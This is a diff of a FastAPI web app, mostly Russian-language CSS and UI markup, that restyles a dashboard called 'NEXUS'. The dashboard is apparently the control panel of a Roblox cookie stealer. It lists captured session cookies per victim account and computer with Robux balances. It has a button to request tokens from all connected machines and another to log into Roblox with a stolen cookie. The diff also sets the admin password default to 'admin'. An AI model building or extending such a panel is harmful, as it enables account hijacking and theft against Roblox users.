@@ -5,7 +5,7 @@ import json, secrets, os, httpx
 from datetime import datetime
 
 app = FastAPI()
-ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin")
 SESSIONS = {}
 PROFILE = {"username": "Admin", "avatar": "", "bio": ""}
 COOKIE_TRIGGER = False
@@ -165,84 +165,168 @@ async def get_settings(session=Depends(require_session)):
 
 HTML = r"""
 <!DOCTYPE html>
-<html lang="ru" data-theme="purple">
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Robrain Dashboard</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',sans-serif;min-height:100vh;background:var(--bg);color:var(--text);transition:.3s}
-:root,[data-theme="purple"]{--bg:#0d0618;--card:#1a0d2e;--border:#2d1560;--accent:#b47bff;--accent2:#c9a0ff;--text:#e6edf3;--text2:#8a82a0;--glow:0 0 20px rgba(180,123,255,.3);--glow2:0 0 40px rgba(180,123,255,.15);--btn-bg:#2d1560;--btn-hover:#3d2080;--danger:#ff5c6e;--success:#3dd68c}
-[data-theme="blue"]{--bg:#0a0e1a;--card:#0f1a30;--border:#1a3055;--accent:#4da6ff;--accent2:#80bfff;--glow:0 0 20px rgba(77,166,255,.3);--glow2:0 0 40px rgba(77,166,255,.15);--btn-bg:#1a3055;--btn-hover:#264575}
-[data-theme="red"]{--bg:#1a0a0a;--card:#2e0f0f;--border:#551a1a;--accent:#ff4d4d;--accent2:#ff8080;--glow:0 0 20px rgba(255,77,77,.3);--glow2:0 0 40px rgba(255,77,77,.15);--btn-bg:#551a1a;--btn-hover:#752525}
-[data-theme="green"]{--bg:#0a1a0a;--card:#0f2e0f;--border:#1a551a;--accent:#4dff4d;--accent2:#80ff80;--glow:0 0 20px rgba(77,255,77,.3);--glow2:0 0 40px rgba(77,255,77,.15);--btn-bg:#1a551a;--btn-hover:#257525}
-[data-theme="crimson"]{--bg:#0d0608;--card:#2e0d14;--border:#551525;--accent:#dc143c;--accent2:#ff4d6d;--glow:0 0 20px rgba(220,20,60,.3);--glow2:0 0 40px rgba(220,20,60,.15);--btn-bg:#551525;--btn-hover:#752035}
-[data-theme="gold"]{--bg:#0d0b04;--card:#2e2408;--border:#553d0a;--accent:#ffd700;--accent2:#ffe44d;--glow:0 0 20px rgba(255,215,0,.3);--glow2:0 0 40px rgba(255,215,0,.15);--btn-bg:#553d0a;--btn-hover:#755010}
-[data-theme="sakura"]{--bg:#0d0618;--card:#1a0d2e;--border:#2d1560;--accent:#ff69b4;--accent2:#ff99cc;--glow:0 0 20px rgba(255,105,180,.3);--glow2:0 0 40px rgba(255,105,180,.15);--btn-bg:#55253a;--btn-hover:#753550}
-.container{max-width:1200px;margin:0 auto;padding:30px 20px}
-.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh}
-.login-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:50px 40px;width:380px;box-shadow:var(--glow2);text-align:center}
-.login-box h1{font-size:24px;margin-bottom:8px;color:var(--accent)}
-.login-box p{color:var(--text2);margin-bottom:30px;font-size:14px}
-.login-box input{width:100%;padding:14px 16px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:15px;outline:none;transition:.2s;margin-bottom:16px}
-.login-box input:focus{border-color:var(--accent);box-shadow:var(--glow)}
-.header-actions{display:flex;gap:10px;align-items:center}
-.header-actions span{color:var(--text2);font-size:14px}
-.theme-dots{display:flex;gap:6px}
-.theme-dot{width:28px;height:28px;border-radius:50%;border:2px solid transparent;cursor:pointer;transition:.2s}
-.theme-dot:hover{transform:scale(1.15)}
-.theme-dot.active{border-color:var(--text);box-shadow:0 0 10px rgba(255,255,255,.2)}
-.theme-dot.purple{background:#b47bff}.theme-dot.blue{background:#4da6ff}.theme-dot.red{background:#ff4d4d}.theme-dot.green{background:#4dff4d}.theme-dot.crimson{background:#dc143c}.theme-dot.gold{background:#ffd700}.theme-dot.sakura{background:#ff69b4}
-.btn{padding:10px 20px;border:none;border-radius:10px;cursor:pointer;font-size:13px;font-weight:600;transition:.2s;display:inline-flex;align-items:center;gap:6px}
-.btn-primary{background:var(--accent);color:var(--bg)}
-.btn-primary:hover{box-shadow:var(--glow);transform:translateY(-1px)}
-.btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
-.btn-outline:hover{border-color:var(--accent);color:var(--accent)}
-.btn-danger{background:var(--danger);color:#fff}
-.btn-sm{padding:7px 14px;font-size:12px}
-.profile-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;padding-bottom:20px;border-bottom:1px solid var(--border);flex-wrap:wrap;gap:12px}
-.profile-info{display:flex;align-items:center;gap:12px}
-.profile-avatar{width:48px;height:48px;border-radius:50%;border:2px solid var(--accent);object-fit:cover;display:flex;align-items:center;justify-content:center;font-size:24px}
-.profile-avatar.placeholder{background:var(--card)}
-.profile-name{font-size:18px;font-weight:700;color:var(--accent)}
-.profile-bio{font-size:12px;color:var(--text2);margin-top:2px}
-.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
-.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px;transition:.3s;position:relative;overflow:hidden}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent);opacity:0;transition:.3s}
-.card:hover::before{opacity:1}
-.card:hover{border-color:var(--accent);box-shadow:var(--glow);transform:translateY(-2px)}
-.card-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
-.card-name{font-size:16px;font-weight:700}
-.card-user{font-size:12px;color:var(--text2);margin-top:1px}
-.card-time{font-size:11px;color:var(--text2)}
-.rbx-avatar{width:44px;height:44px;border-radius:50%;border:2px solid var(--accent);object-fit:cover;flex-shrink:0}
-.rbx-avatar.placeholder{background:var(--card);display:flex;align-items:center;justify-content:center;font-size:20px}
-.card-cookie{font-size:11px;color:var(--text2);word-break:break-all;margin-bottom:12px;padding:8px 10px;background:rgba(0,0,0,.3);border-radius:8px;font-family:monospace;max-height:50px;overflow:hidden;cursor:pointer}
-.card-cookie:hover{max-height:200px}
-.card-bottom{display:flex;justify-content:space-between;align-items:center;gap:8px}
-.robux-badge{background:rgba(255,215,0,.15);color:#ffd700;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;border:1px solid rgba(255,215,0,.3)}
-.empty{text-align:center;color:var(--text2);padding:60px 20px;font-size:15px}
-.empty h2{color:var(--accent);margin-bottom:8px}
-.logout-btn{background:none;border:1px solid var(--danger);color:var(--danger);padding:8px 16px;border-radius:8px;cursor:pointer;font-size:12px;transition:.2s}
-.logout-btn:hover{background:var(--danger);color:#fff}
-.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
-.modal-overlay.open{display:flex}
-.modal{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:30px;width:420px;max-width:90vw}
-.modal h2{margin-bottom:20px;color:var(--accent)}
-.modal label{display:block;font-size:13px;color:var(--text2);margin-bottom:6px;margin-top:14px}
-.modal-actions{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}
-@keyframes fall{0%{transform:translateY(-10vh) rotate(0deg);opacity:0}10%{opacity:1}100%{transform:translateY(110vh) rotate(720deg);opacity:0}}
-.petal{position:fixed;top:-10vh;width:14px;height:14px;background:#ff69b4;border-radius:50% 0;opacity:0;pointer-events:none;z-index:0;animation:fall linear infinite}
-.petal:nth-child(2n){width:10px;height:10px;background:#ff99cc}
-.petal:nth-child(3n){width:12px;height:12px;background:#ff85c8}
-.petal:nth-child(4n){border-radius:0 50%}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>NEXUS — Приборная панель</title>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+/* CSS based on NEXUS Pro Max Glassmorphism */
+:root {
+  --bg-color: #030306;
+  --bg-gradient: radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.06) 0%, transparent 40%),
+                 radial-gradient(circle at 90% 80%, rgba(255, 0, 127, 0.05) 0%, transparent 40%),
+                 #030306;
+  --surface: rgba(10, 10, 16, 0.6);
+  --surface-solid: #09090e;
+  --surface-hover: rgba(18, 18, 28, 0.85);
+  --surface-active: rgba(28, 28, 40, 0.95);
+  --border: rgba(255, 255, 255, 0.05);
+  --border-glow: rgba(0, 240, 255, 0.3);
+  --border-hover: rgba(255, 255, 255, 0.15);
+  --accent: #00f0ff; 
+  --accent-secondary: #ff007f; 
+  --accent-soft: rgba(0, 240, 255, 0.12);
+  --accent-glow: rgba(0, 240, 255, 0.25);
+  --accent-text: #7efff5;
+  --text: #f1f5f9;
+  --text-secondary: #94a3b8;
+  --text-muted: #475569;
+  --success: #00ff88; 
+  --danger: #ff0055; 
+  --warning: #ff9f1c; 
+  --gold: #ffd60a;
+  --radius-sm: 12px;
+  --radius-md: 18px;
+  --radius-lg: 24px;
+  --radius-xl: 32px;
+  --shadow-base: 0 10px 40px -10px rgba(0, 0, 0, 0.7);
+  --shadow-glow: 0 0 25px var(--accent-glow);
+  --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+  --transition-slow: all 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
+  --transition-bounce: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; font-size: 13px; }
+body {
+  font-family: 'Outfit', sans-serif;
+  background-color: var(--bg-color);
+  background-image: var(--bg-gradient);
+  background-attachment: fixed;
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+  display: flex;
+}
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.03'/%3E%3C/svg%3E");
+  z-index: -1;
+  pointer-events: none;
+}
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.1); border-radius: 10px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+::selection { background: var(--accent); color: #fff; }
+
+.sidebar-layout { display: flex; width: 100vw; height: 100vh; height: 100dvh; overflow: hidden; }
+.sidebar {
+  width: 280px; height: 100%;
+  background: rgba(15, 17, 26, 0.5); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+  border-right: 1px solid rgba(255, 255, 255, 0.08);
+  display: flex; flex-direction: column; padding: 2rem 1.5rem; z-index: 100; transition: var(--transition); position: relative;
+}
+.sidebar::after {
+  content: ''; position: absolute; top: 0; right: 0; width: 1px; height: 100%;
+  background: linear-gradient(to bottom, transparent, var(--accent), transparent); opacity: 0.3;
+}
+.main-content { flex: 1; height: 100%; overflow-y: auto; padding: 2rem 3rem; position: relative; }
+.logo { display: flex; align-items: center; justify-content: center; gap: 15px; font-size: 1.8rem; font-weight: 800; letter-spacing: 2px; color: var(--text); margin-bottom: 3rem; text-transform: uppercase; }
+.logo-icon { width: 40px; height: 40px; background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; box-shadow: 0 0 20px var(--accent-glow); animation: pulse-glow 3s infinite alternate; }
+@keyframes pulse-glow { 0% { box-shadow: 0 0 15px var(--accent-glow); } 100% { box-shadow: 0 0 30px var(--accent); } }
+.nav-links { display: flex; flex-direction: column; gap: 12px; }
+.nav-link { color: var(--text-secondary); text-decoration: none; font-size: 0.95rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; padding: 1rem 1.2rem; border-radius: 12px; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: flex-start; padding-left: 2rem; gap: 12px; position: relative; overflow: hidden; border: 1px solid transparent; cursor: pointer; }
+.nav-icon { display: flex; align-items: center; justify-content: center; }
+.nav-icon svg { width: 20px; height: 20px; }
+.nav-link:hover { color: var(--text); background: rgba(255, 255, 255, 0.03); border-color: rgba(255, 255, 255, 0.05); }
+.nav-link.active { color: #fff; background: var(--accent-soft); border: 1px solid var(--accent-glow); font-weight: 700; box-shadow: 0 0 20px var(--accent-glow); }
+.user-badge { display: flex; align-items: center; gap: 14px; padding: 1rem 1.2rem; background: transparent; border: none; border-radius: 16px; margin-top: auto; transition: all 0.3s ease; }
+.user-badge:hover { background: rgba(255, 255, 255, 0.02); }
+.user-avatar { font-size: 1.5rem; width: 42px; height: 42px; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.01)); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; color: #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); overflow:hidden;}
+.user-avatar img { width: 100%; height: 100%; border-radius: 12px; object-fit: cover; }
+.user-info { display: flex; flex-direction: column; flex: 1; gap: 4px; }
+.user-name { font-size: 0.95rem; font-weight: 600; color: var(--text); letter-spacing: 0.5px; }
+.btn-logout { background: transparent; color: var(--danger); border: none; font-size: 0.8rem; font-weight: 500; text-align: left; padding: 0; cursor: pointer; transition: var(--transition); opacity: 0.8; }
+.btn-logout:hover { opacity: 1; text-shadow: 0 0 8px var(--danger); }
+.top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; animation: slideDown 0.6s ease-out; }
+.page-title { font-size: 2.5rem; font-weight: 800; background: linear-gradient(135deg, #fff, var(--text-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
+@keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+.stats-bar { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.25rem; margin-bottom: 2rem; }
+.stat-card { background: var(--surface); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid var(--border); border-radius: var(--radius-xl); padding: 1.5rem; position: relative; overflow: hidden; transition: var(--transition-bounce); animation: fadeInUp 0.5s backwards; display: flex; flex-direction: column; justify-content: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+@keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+.stat-card:hover { border-color: var(--border-glow); transform: translateY(-4px) scale(1.02); box-shadow: var(--shadow-glow); background: var(--surface-hover); }
+.stat-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; }
+.stat-value { font-size: 1.8rem; font-weight: 800; color: var(--text); }
+.stat-value.accent { background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+.controls-panel { display: flex; gap: 1rem; align-items: center; justify-content: space-between; margin-bottom: 2rem; background: var(--surface); backdrop-filter: blur(10px); padding: 1rem; border-radius: var(--radius-lg); border: 1px solid var(--border); animation: fadeIn 0.8s ease backwards 0.3s; }
+@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+.btn-refresh, .btn-submit, .modal-btn { background: linear-gradient(135deg, var(--surface-hover), var(--surface-active)); border: 1px solid var(--border); color: var(--text); padding: 0.8rem 1.8rem; border-radius: var(--radius-lg); font-weight: 700; font-size: 0.95rem; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.2); position: relative; overflow: hidden; }
+.btn-refresh::after, .btn-submit::after, .modal-btn::after { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); transform: skewX(-20deg); transition: 0.5s; }
+.btn-refresh:hover::after, .btn-submit:hover::after, .modal-btn:hover::after { left: 150%; }
+.btn-refresh:hover, .btn-submit:hover, .modal-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px var(--accent-glow); }
+.tokens-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; }
+.token-card { background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.08); border-radius: var(--radius-lg); overflow: hidden; position: relative; transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1); cursor: pointer; animation: zoomIn 0.5s backwards; padding: 1.5rem; display: flex; flex-direction: column; align-items: center; }
+@keyframes zoomIn { from { opacity:0; transform:scale(0.95); } to { opacity:1; transform:scale(1); } }
+.token-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, var(--accent), transparent); opacity: 0; transition: 0.4s; }
+.token-card:hover { transform: translateY(-10px) scale(1.02); border-color: var(--border-hover); box-shadow: 0 15px 40px -5px rgba(0,0,0,0.5), 0 0 20px var(--accent-soft); background: rgba(30, 41, 59, 0.8); }
+.token-card:hover::before { opacity: 1; }
+.token-card-status { position: absolute; top: 15px; right: 15px; }
+.token-card-robux { position: absolute; top: 15px; left: 15px; background: rgba(251, 191, 36, 0.1); color: #fbbf24; padding: 4px 10px; border-radius: 20px; font-weight: 800; font-size: 0.85rem; border: 1px solid rgba(251, 191, 36, 0.3); box-shadow: 0 0 10px rgba(251, 191, 36, 0.2); }
+.token-card-avatar { width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin-bottom: 1rem; margin-top: 1.5rem; border: 2px solid rgba(255,255,255,0.1); object-fit:cover; }
+.token-card-name { font-size: 1.3rem; font-weight: 800; margin-bottom: 0.5rem; color: #fff; text-align: center; }
+.token-card-computer { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 5px; }
+.token-card-actions { width: 100%; display: flex; flex-direction: column; gap: 8px; margin-top: auto; }
+.btn-login { background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(16, 185, 129, 0.05)); border: 1px solid rgba(16, 185, 129, 0.3); color: #34d399; width: 100%; padding: 12px; border-radius: 12px; font-weight: 700; font-size: 1rem; cursor: pointer; transition: all 0.2s ease; display: flex; justify-content: center; align-items: center; gap: 8px; }
+.btn-login:hover { background: linear-gradient(135deg, rgba(16, 185, 129, 0.3), rgba(16, 185, 129, 0.1)); box-shadow: 0 0 15px rgba(16, 185, 129, 0.2); }
+.btn-secondary { background: rgba(255,255,255,0.03); border: 1px solid var(--border); color: var(--text-muted); width: 100%; padding: 8px; border-radius: 8px; font-size: 0.85rem; cursor: pointer; transition: all 0.2s ease; font-family: inherit;}
+.btn-secondary:hover { background: rgba(255,255,255,0.08); color: #fff; border-color:var(--danger); color:var(--danger);}
+
+.login-body { display: flex; align-items: center; justify-content: center; height: 100vh; width: 100%; }
+.login-card { background: rgba(15, 17, 26, 0.6); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); padding: 3rem 2.5rem; border-radius: var(--radius-xl); width: 100%; max-width: 420px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 40px var(--accent-glow); text-align: center; animation: scaleUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
+@keyframes scaleUp { from { transform: scale(0.9); opacity:0; } to { transform: scale(1); opacity: 1;} }
+.login-logo { margin-bottom: 2rem; display:flex; flex-direction:column; align-items:center; }
+.login-logo-icon { font-size: 3rem; width: 80px; height: 80px; border-radius: 20px; animation: pulse-glow 2s infinite alternate; background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); display:flex; align-items:center; justify-content:center;}
+.login-logo-text { font-size: 2rem; font-weight: 900; margin-top: 1rem; letter-spacing: 4px; }
+.input-group { margin-bottom: 1.5rem; text-align: left; }
+.input-group label { display: block; font-size: 0.9rem; color: var(--text-secondary); margin-bottom: 0.5rem; }
+.input-group input, .input-group textarea { width: 100%; padding: 1rem 1.2rem; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); border-radius: var(--radius-md); color: white; font-size: 1rem; transition: var(--transition); outline: none; font-family: inherit;}
+.input-group input:focus, .input-group textarea:focus { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-soft); }
+.btn-submit { width: 100%; font-size: 1.1rem; padding: 1rem; background: linear-gradient(135deg, var(--accent-soft), transparent); border-color: var(--accent); color: var(--accent); cursor: pointer; border: 1px solid var(--accent); border-radius: var(--radius-lg); font-weight: 700; transition: var(--transition);}
+.btn-submit:hover { background: var(--accent); color: #000; box-shadow: 0 0 25px var(--accent-glow); }
+
+.modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); z-index: 1000; display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: var(--transition); }
+.modal-overlay.active { opacity: 1; pointer-events: auto; }
+.modal-container { background: var(--bg-color); border: 1px solid var(--border); border-radius: var(--radius-xl); width: 95%; max-width: 500px; padding: 2rem; display: flex; flex-direction: column; transform: scale(0.9); transition: var(--transition-bounce); box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 40px var(--accent-glow); position: relative; }
+.modal-overlay.active .modal-container { transform: scale(1); }
+.modal-close { position: absolute; top: 1.5rem; right: 1.5rem; background: transparent; border: none; color: var(--text-secondary); font-size: 1.5rem; cursor: pointer; transition: var(--transition); }
+.modal-close:hover { color: var(--danger); transform: rotate(90deg); }
+.modal-title { font-size: 1.5rem; font-weight: 800; margin-bottom: 1.5rem; text-align: center; color: var(--text); }
+.modal-btn { width: 100%; margin-top: 1rem; background: linear-gradient(135deg, var(--surface-hover), var(--surface-active)); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 0.8rem; color: var(--text); font-weight: 700; font-size: 0.95rem; cursor: pointer; transition: var(--transition);}
+.modal-btn:hover { background: var(--accent); color: #000; border-color: var(--accent); box-shadow: 0 0 15px var(--accent-glow); }
+
 </style>
 </head>
-<body><div id="app"></div>
+<body>
+<div id="app" style="display: contents;"></div>
 <script>
 const app = document.getElementById('app');
-let state = { authenticated: false, cookies: [], theme: 'purple' };
+let state = { authenticated: false, cookies: [], profile: {} };
 
 async function api(method, path, body) {
     const opts = { method, headers: {} };
@@ -256,9 +340,7 @@ async function init() {
     const auth = await api('GET', '/api/check-auth');
     if (auth && auth.authenticated) {
         state.authenticated = true;
-        state.theme = auth.theme || 'purple';
         state.profile = { username: auth.username || 'Admin', avatar: auth.avatar || '', bio: auth.bio || '' };
-        document.documentElement.setAttribute('data-theme', state.theme);
         const c = await api('GET', '/api/cookies');
         if (c) state.cookies = c;
     }
@@ -266,21 +348,163 @@ async function init() {
 }
 
 function render() {
-    if (!state.authenticated) renderLogin();
-    else renderDashboard();
+    if (!state.authenticated) {
+        app.innerHTML = `
+        <div class="login-body">
+            <div class="login-card">
+                <div class="login-logo">
+                    <div class="login-logo-icon">🛡️</div>
+                    <div class="login-logo-text">NEXUS</div>
+                </div>
+                <h1 style="font-size: 1.5rem; margin-bottom: 0.5rem; font-weight: 800;">Вход в систему</h1>
+                <div style="color: var(--text-secondary); margin-bottom: 2rem;">Авторизация для управления узлами</div>
+                <div class="input-group">
+                    <input type="password" id="pwd" placeholder="Пароль" onkeydown="if(event.key==='Enter') login()">
+                </div>
+                <button class="btn-submit" onclick="login()">Войти</button>
+                <div id="login-error" style="color:var(--danger);margin-top:1rem;font-size:0.9rem"></div>
+            </div>
+        </div>`;
+    } else {
+        const robuxTotal = state.cookies.reduce((acc, c) => acc + (c.robux || 0), 0);
+        
+        app.innerHTML = `
+        <div class="sidebar-layout">
+            <div class="sidebar">
+                <div class="logo">
+                    <div class="logo-icon">🛡️</div>
+                    <span class="logo-text">NEXUS</span>
+                </div>
+                <div class="nav-links">
+                    <a class="nav-link active">
+                        <div class="nav-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"></rect><rect x="14" y="3" width="7" height="5"></rect><rect x="14" y="12" width="7" height="9"></rect><rect x="3" y="16" width="7" height="5"></rect></svg></div>
+                        <span class="nav-label">Токены</span>
+                    </a>
+                    <a class="nav-link" onclick="openSettings()">
+                        <div class="nav-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div>
+                        <span class="nav-label">Настройки</span>
+                    </a>
+                </div>
+                <div class="user-badge">
+                    <span class="user-avatar">${state.profile.avatar ? '<img src="' + state.profile.avatar + '">' : '👤'}</span>
+                    <div class="user-info">
+                        <span class="user-name">${state.profile.username || 'Admin'}</span>
+                        <button class="btn-logout" onclick="logout()">Выйти</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="main-content">
+                <div class="top-bar">
+                    <h1 class="page-title">База токенов</h1>
+                </div>
+                
+                <div class="stats-bar">
+                    <div class="stat-card">
+                        <div class="stat-label">Всего аккаунтов</div>
+                        <div class="stat-value accent">${state.cookies.length}</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">Рабочих</div>
+                        <div class="stat-value" style="color: var(--success)">${state.cookies.length}</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">Общий Robux</div>
+                        <div class="stat-value" style="color: var(--gold)">${robuxTotal}</div>
+                    </div>
+                </div>
+                
+                <div class="controls-panel">
+                    <div style="font-size: 1rem; color: var(--text-secondary);">Управление базой данных токенов</div>
+                    <div style="display:flex; gap:10px;">
+                        <button class="btn-refresh" id="btnRequestAll" style="border-color:rgba(99,102,241,0.2); color:var(--accent);" onclick="requestTokens()">📡 Запросить у всех</button>
+                        <button class="btn-refresh" onclick="refreshCookies()">↻ Обновить</button>
+                    </div>
+                </div>
+                
+                <div class="tokens-grid" id="cards"></div>
+            </div>
+            
+            <div class="modal-overlay" id="settings-modal">
+                <div class="modal-container">
+                    <button class="modal-close" onclick="closeSettings()">✕</button>
+                    <div class="modal-title">Настройки профиля</div>
+                    <div class="input-group">
+                        <label>Отображаемое имя</label>
+                        <input type="text" id="set-name" value="${state.profile.username || ''}">
+                    </div>
+                    <div class="input-group">
+                        <label>URL Аватарки</label>
+                        <input type="text" id="set-avatar" value="${state.profile.avatar || ''}">
+                    </div>
+                    <div class="input-group">
+                        <label>О себе</label>
+                        <textarea id="set-bio" rows="3">${state.profile.bio || ''}</textarea>
+                    </div>
+                    <button class="modal-btn" onclick="saveProfile()">Сохранить изменения</button>
+                </div>
+            </div>
+        </div>`;
+        renderCards();
+    }
 }
 
-function renderLogin() {
-    app.innerHTML = `
-    <div class="login-page">
-      <div class="login-box">
-        <h1>🛡 Robrain</h1>
-        <p>Enter password to access dashboard</p>
-        <input type="password" id="pwd" placeholder="Password" onkeydown="if(event.key==='Enter') login()">
-        <button class="btn btn-primary" style="width:100%" onclick="login()">Sign In</button>
-        <div id="login-error" style="color:var(--danger);margin-top:12px;font-size:13px"></div>
+function renderCards() {
+    const container = document.getElementById('cards');
+    if (!container) return;
+    if (!state.cookies.length) {
+        container.innerHTML = '<div style="grid-column: 1 / -1; text-align: center; padding: 4rem; color: var(--text-secondary); font-size: 1.2rem;">База данных пуста</div>';
+        return;
+    }
+    container.innerHTML = state.cookies.map((c, i) => `
+    <div class="token-card">
+      <div class="token-card-robux">💰 ${c.robux ?? '?'} R$</div>
+      ${c.avatar ? '<img src="' + c.avatar + '" class="token-card-avatar">' : '<div class="token-card-avatar">👤</div>'}
+      <div class="token-card-name">${c.username}</div>
+      <div class="token-card-computer">@${c.roblox_user || c.username}</div>
+      
+      <div class="token-card-actions">
+        <button class="btn-login" onclick="loginToRoblox('${c.cookie.replace(/'/g, "\\'")}')">
